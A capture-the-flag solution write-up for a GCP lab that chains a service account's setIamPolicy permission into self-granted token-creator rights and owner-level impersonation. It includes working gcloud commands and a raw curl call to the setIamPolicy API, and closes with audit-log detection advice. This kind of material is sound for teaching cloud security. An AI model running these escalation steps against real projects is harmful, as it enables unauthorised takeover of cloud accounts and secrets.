# Solution: Service Account setIamPolicy to Admin

Being able to *write* a service account's IAM policy is one of the quietest privilege escalation primitives in GCP. Most people reason about impersonation in terms of `roles/iam.serviceAccountTokenCreator` -- "who can mint tokens for this account?" -- but they forget that anyone who can edit the account's policy can simply *add themselves* to that role. The permission that allows this, `iam.serviceAccounts.setIamPolicy`, sounds administrative and harmless ("manage who has access to this SA"), yet in practice it is equivalent to holding the account's credentials: if you can rewrite the policy, you can grant yourself impersonation and then borrow the identity.

This technique was first documented by Rhino Security Labs in "Privilege Escalation in Google Cloud Platform – Part 2," and later catalogued by NetSPI's GCPwn as the `CAN_MODIFY_SA_IAM` edge. In this lab you start as a service account with no project permissions of its own and finish by reading a secret that requires `roles/owner`-level access -- entirely by rewriting one IAM policy and chaining two impersonation hops.

## The Challenge

You start as `pl-prod-gcp-iam-002-start`, a service account whose credentials (via impersonation) were provided to you. On its own it has no project-level IAM roles -- it can't read Compute instances, list Cloud Storage buckets, or read Secret Manager secrets.

Elsewhere in the project lives `pl-prod-gcp-iam-002-target`, a service account that holds `roles/owner` on the project -- GCP's most powerful primitive role. Your starting account has been given exactly one unusual permission on that target: `iam.serviceAccounts.setIamPolicy`. Your job is to turn the ability to *write the target's policy* into the ability to *act as the target*.

## Reconnaissance

Start by confirming what you can and can't do. Check your identity and try the thing you ultimately want:

```bash
gcloud auth list --filter=status:ACTIVE --format='value(account)'
# pl-prod-gcp-iam-002-start@<project_id>.iam.gserviceaccount.com

gcloud secrets versions access latest --secret=pl-gcp-iam-002-flag \
  --impersonate-service-account=pl-prod-gcp-iam-002-start@<project_id>.iam.gserviceaccount.com
# ERROR: PERMISSION_DENIED: Permission 'secretmanager.versions.access' denied ...
```

No direct access, as expected. Now enumerate the project's service accounts to find candidates whose policy you might be able to rewrite:

```bash
gcloud iam service-accounts list --project=<project_id> \
  --impersonate-service-account=pl-prod-gcp-iam-002-start@<project_id>.iam.gserviceaccount.com
```

`pl-prod-gcp-iam-002-target` stands out. If `gcloud` lets you read its policy, you'll notice your own account already appears there with a custom role -- one scoped to exactly `iam.serviceAccounts.setIamPolicy`:

```bash
gcloud iam service-accounts get-iam-policy \
  pl-prod-gcp-iam-002-target@<project_id>.iam.gserviceaccount.com \
  --impersonate-service-account=pl-prod-gcp-iam-002-start@<project_id>.iam.gserviceaccount.com
```

That single binding is the whole vulnerability. Worth noting for later: reading the policy with `get-iam-policy` is a convenience, not a requirement. The exploit only needs to *write* the policy, and as you'll see, `setIamPolicy` can be called without ever reading first.

## Exploitation

Because you can overwrite the target's IAM policy, you can add a binding that grants *yourself* `roles/iam.serviceAccountTokenCreator` on it. The simplest way is `gcloud`'s `add-iam-policy-binding`, which reads the current policy, merges your new binding, and writes it back:

```bash
gcloud iam service-accounts add-iam-policy-binding \
  pl-prod-gcp-iam-002-target@<project_id>.iam.gserviceaccount.com \
  --member=serviceAccount:pl-prod-gcp-iam-002-start@<project_id>.iam.gserviceaccount.com \
  --role=roles/iam.serviceAccountTokenCreator \
  --impersonate-service-account=pl-prod-gcp-iam-002-start@<project_id>.iam.gserviceaccount.com
```

Notice that `add-iam-policy-binding` performs a `getIamPolicy` read before writing -- which is why the lab also grants `iam.serviceAccounts.getIamPolicy` as a *helpful* permission. But that read is a `gcloud` mechanic, not a requirement of the technique. The raw `setIamPolicy` REST method accepts a complete policy body that you construct from scratch, so you can self-grant tokenCreator with `setIamPolicy` alone. The demo's `--api-only` mode proves this by minting a starting-SA token and POSTing a minimal policy directly:

```bash
curl -X POST \
  -H "Authorization: Bearer $STARTING_SA_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"policy":{"bindings":[{"role":"roles/iam.serviceAccountTokenCreator","members":["serviceAccount:pl-prod-gcp-iam-002-start@<project_id>.iam.gserviceaccount.com"]}]}}' \
  "https://iam.googleapis.com/v1/projects/<project_id>/serviceAccounts/pl-prod-gcp-iam-002-target@<project_id>.iam.gserviceaccount.com:setIamPolicy"
```

Either way, give the new binding about 15 seconds to propagate. Now you hold `roles/iam.serviceAccountTokenCreator` on the target, so you can chain impersonation: your ADC mints a token for the starting SA (the deployer granted you that), and the starting SA -- now a token creator on the target -- mints a token for the target SA. `gcloud` expresses the whole chain as a comma-separated delegation list:

```bash
gcloud auth print-access-token \
  --impersonate-service-account=pl-prod-gcp-iam-002-start@<project_id>.iam.gserviceaccount.com,pl-prod-gcp-iam-002-target@<project_id>.iam.gserviceaccount.com
```

## Verification

Confirm you are now operating with the target account's privileges, not your own, by performing a write your starting account could never do -- updating a project label (which requires project-level write access that `roles/owner` provides):

```bash
gcloud projects update <project_id> \
  --update-labels=pl-privesc-verified=true \
  --impersonate-service-account=pl-prod-gcp-iam-002-start@<project_id>.iam.gserviceaccount.com,pl-prod-gcp-iam-002-target@<project_id>.iam.gserviceaccount.com
```

The write succeeds, confirming the chained impersonation now carries the target account's `roles/owner` project access. (The demo removes the label afterward to leave the project clean.)

## Capture the Flag

The CTF flag lives as the latest version of a Secret Manager secret. With the full impersonation chain in place, read it directly as the target service account:

```bash
gcloud secrets versions access latest \
  --secret=pl-gcp-iam-002-flag \
  --impersonate-service-account=pl-prod-gcp-iam-002-start@<project_id>.iam.gserviceaccount.com,pl-prod-gcp-iam-002-target@<project_id>.iam.gserviceaccount.com
```

This works because `roles/owner` natively includes `secretmanager.versions.access`, so controlling the target service account is sufficient to read the flag -- no extra grant is involved. By impersonating the target, you inherit all of its `roles/owner` project permissions. You never needed a role of your own; you only needed to rewrite one policy so you could borrow an identity that already had them.

## What Happened

You escalated from a service account with zero project-level permissions to one holding `roles/owner` -- and from there to a project secret -- by abusing a single misconfigured permission: `iam.serviceAccounts.setIamPolicy` granted across a privilege boundary. The ability to write a service account's IAM policy let you grant yourself `roles/iam.serviceAccountTokenCreator`, and from there chained impersonation did the rest. No keys were stolen and no application vulnerability was exploited.

The important lesson for defenders is where to look. It's tempting to monitor `getIamPolicy` reads as reconnaissance, but that's a bypassable and noisy signal -- the raw `setIamPolicy` API never reads first. The reliable detection keys on the *effective* `iam.serviceAccounts.setIamPolicy` permission on an enabled service account (whether it arrives via `roles/iam.serviceAccountAdmin` or a custom role), and on the audit-log signature of a `SetIamPolicy` call that adds a tokenCreator binding for the caller, immediately followed by a `GenerateAccessToken` for that same account. Treat "can write this SA's policy" as "can impersonate this SA," and the escalation path disappears.
